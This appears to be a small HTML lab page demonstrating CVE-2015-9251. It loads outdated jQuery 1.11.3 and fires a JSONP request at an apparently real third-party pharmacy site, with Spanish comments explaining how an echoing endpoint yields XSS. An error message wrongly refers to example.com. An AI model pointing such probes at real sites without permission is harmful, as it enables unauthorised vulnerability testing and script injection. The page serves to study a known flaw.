<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>PoC CVE-2015-9251 Lab</title>
    <script src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
</head>
<body>
    <h1>Testing CVE-2015-9251</h1>
    <p>Abre la consola del navegador (F12) para ver la magia.</p>

    <script>
        // Esta función simula la llamada.
        // En un ataque real, esto inyectaría el script si el endpoint no sanea el input.
        $.ajax({
            // El truco está aquí: jQuery < 3.0 no filtraba bien lo que venía en el callback
            // Si el servidor destino "repite" lo que le mandas, te comes el XSS.
            url: "https://farmaciatenerife.com", 
            dataType: "jsonp", 
            success: function(response) {
                console.log("Si ves esto, el servidor respondió algo válido:", response);
            },
            error: function(xhr, status, error) {
                console.warn("Fallo esperado si example.com no es vulnerable:", error);
            }
        });
    </script>
</body>
</html>
